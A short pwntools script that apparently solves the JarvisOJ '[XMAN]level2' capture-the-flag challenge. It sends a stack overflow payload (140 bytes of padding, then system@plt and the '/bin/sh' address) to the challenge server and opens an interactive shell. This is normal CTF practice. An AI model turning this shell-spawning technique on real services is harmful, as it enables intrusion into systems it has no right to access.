from pwn import *


def x_man_level2(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/[XMAN]level2'):
    print('[XMAN]level2 start')
    # io = process([file_name])
    io = remote('pwn2.jarvisoj.com', 9878)
    elf = ELF(file_name)

    bin_sh_addr = p32(next(elf.search(b'/bin/sh')))
    system_plt = p32(elf.plt['system'])

    payload = b'A' * 140

    # system('/bin/sh')
    payload += system_plt + p32(0xdeadbeef) + bin_sh_addr

    io.sendline(payload)

    io.interactive()

    print('[XMAN]level2 end')


if __name__ == '__main__':
    x_man_level2()
